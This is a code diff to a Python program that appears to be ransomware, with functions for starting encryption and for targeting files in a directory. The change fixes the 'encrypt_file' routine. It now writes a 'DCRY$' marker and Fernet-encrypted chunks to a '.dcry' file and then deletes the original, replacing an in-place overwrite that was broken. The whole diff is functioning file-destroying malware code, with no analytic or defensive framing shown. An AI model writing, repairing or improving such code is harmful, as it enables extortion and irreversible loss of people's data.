@@ -189,21 +189,16 @@ def start_encryption():
 def encrypt_file(path, key, chunk_size=268435456):
     try:
         MAGIC = b"DCRY$"
-        with open(path, "r+b", buffering=-1) as f:
-            file_size = os.path.getsize(path)
-            f.seek(0)
-            f.write(MAGIC)
-            cipher = Fernet(key=key)
-            offset = len(MAGIC)
-            while (chunk := f.read(chunk_size)):
+        encrypted_path = path + ".dcry"
+        cipher = Fernet(key)
+        with open(path, "rb") as f_in, open(encrypted_path, "wb") as f_out:
+            f_out.write(MAGIC)
+            while chunk := f_in.read(chunk_size):
                 encrypted_chunk = cipher.encrypt(chunk)
-                f.seek(offset)
-                f.write(encrypted_chunk)
-                offset += len(chunk)
-        os.rename(path, path + ".dcry")
-    except:
-        pass
-
+                f_out.write(encrypted_chunk)
+        os.remove(path)
+    except Exception as e:
+        print(f"Lỗi: {e}")
 
 def encrypt_directory(directory_path, key):
     files_targeted = [
